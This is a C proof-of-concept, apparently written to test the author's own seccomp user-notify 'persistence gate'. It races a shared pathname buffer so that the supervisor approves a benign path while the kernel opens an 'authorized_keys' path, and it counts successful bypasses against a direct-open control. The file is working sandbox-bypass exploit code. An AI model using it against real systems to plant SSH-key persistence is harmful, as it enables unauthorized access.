// EXP-11 P11 PoC: TOCTOU on the rootful persistence gate's argument-allow path.
//
// The gate (gate_rootful.c --persist) NOTIFYs openat, reads the pathname from the target's
// memory via /proc/pid/mem, and if the write-path contains no persistence token it ALLOWs the
// call via SECCOMP_USER_NOTIF_FLAG_CONTINUE. CONTINUE makes the KERNEL re-read the pathname
// pointer when it actually runs the syscall. Between the supervisor's read and the kernel's
// re-read, a second thread (which keeps running while the openat thread is parked in the notify)
// rewrites the buffer benign->authorized_keys. If the swap lands in that window, the supervisor
// validated a benign path and the kernel opens the persistence path.
//
//   mode=race   : flipper thread races the buffer; measure how often the evil path is opened
//   mode=direct : no race, open the evil path straight (control: the gate MUST catch this)
//
// Win = kernel opened a path containing "authorized_keys" (confirmed via /proc/self/fd readlink).
// Uses a temp dir, so no real ~/.ssh file is ever touched.
//
// Build: gcc -O2 -pthread toctou_race.c -o toctou_race
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>

static char  g_buf[4096];        // the shared pathname buffer the gate inspects and the kernel reads
static char  g_benign[512], g_evil[512];
static volatile int g_run = 1;

static void *flipper(void *arg) {
    (void)arg;
    size_t be = strlen(g_benign) + 1, ev = strlen(g_evil) + 1;
    while (g_run) {                       // benign-dominant flip: supervisor likely reads benign
        memcpy(g_buf, g_evil, ev);        // ... brief evil window for the kernel re-read to catch
        memcpy(g_buf, g_benign, be);
    }
    return NULL;
}

static int opened_evil(long fd) {
    char lp[64], resolved[1024];
    snprintf(lp, sizeof(lp), "/proc/self/fd/%ld", fd);
    ssize_t r = readlink(lp, resolved, sizeof(resolved) - 1);
    if (r <= 0) return -1;
    resolved[r] = '\0';
    return strstr(resolved, "authorized_keys") ? 1 : 0;
}

int main(int argc, char **argv) {
    if (argc < 5) { fprintf(stderr, "usage: %s <race|direct> <benign> <evil> <N>\n", argv[0]); return 2; }
    int race = strcmp(argv[1], "race") == 0;
    strncpy(g_benign, argv[2], sizeof(g_benign) - 1);
    strncpy(g_evil,   argv[3], sizeof(g_evil) - 1);
    long N = atol(argv[4]);

    long win = 0, benign = 0, denied = 0, other = 0;
    pthread_t th;

    if (race) {
        strcpy(g_buf, g_benign);
        pthread_create(&th, NULL, flipper, NULL);
        for (long i = 0; i < N; i++) {
            long fd = syscall(SYS_openat, AT_FDCWD, g_buf, O_WRONLY | O_CREAT, 0644);
            if (fd < 0) { denied++; continue; }        // supervisor read a persist path -> EPERM
            int e = opened_evil(fd);
            if (e == 1) win++; else if (e == 0) benign++; else other++;
            close((int)fd);
        }
        g_run = 0; pthread_join(th, NULL);
    } else {
        for (long i = 0; i < N; i++) {                 // direct: just open the evil path
            long fd = syscall(SYS_openat, AT_FDCWD, g_evil, O_WRONLY | O_CREAT, 0644);
            if (fd < 0) { denied++; continue; }
            int e = opened_evil(fd);
            if (e == 1) win++; else if (e == 0) benign++; else other++;
            close((int)fd);
        }
    }

    fprintf(stderr, "TOCTOU_RESULT mode=%s N=%ld win=%ld benign=%ld denied=%ld other=%ld\n",
            race ? "race" : "direct", N, win, benign, denied, other);
    return 0;
}
